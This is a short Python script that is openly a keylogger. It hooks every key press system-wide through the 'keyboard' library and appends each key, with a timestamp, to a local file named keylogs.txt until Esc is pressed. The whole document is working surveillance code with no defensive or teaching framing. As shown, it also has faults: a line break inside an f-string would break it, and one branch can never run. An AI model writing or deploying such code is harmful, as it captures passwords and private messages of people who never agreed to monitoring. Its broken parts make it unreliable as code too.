import keyboard
from datetime import datetime
time_format = '%Y-%m-%d %H:%M:%S'
logging_path = 'keylogs.txt'

special_keys = ['space', 'enter']

def write_to_file(text, path=logging_path):
    try:
        with open(path, 'a') as file:
            file.write(f'{datetime.now().strftime(time_format)} {text}
')
    except Exception as e:
        print(f'Error writing to file: {e}')
def on_key_press(event):
    key_pressed = event.name
    if len(key_pressed) > 1:
        write_to_file(f'[{key_pressed.upper()}]')
    elif key_pressed in special_keys:
        write_to_file(f'[{key_pressed.upper()}]')
    else:
        write_to_file(key_pressed)
def start_keylogger():
    keyboard.on_press(callback=on_key_press)
    while True:
        if keyboard.is_pressed('esc'):
            break
start_keylogger()
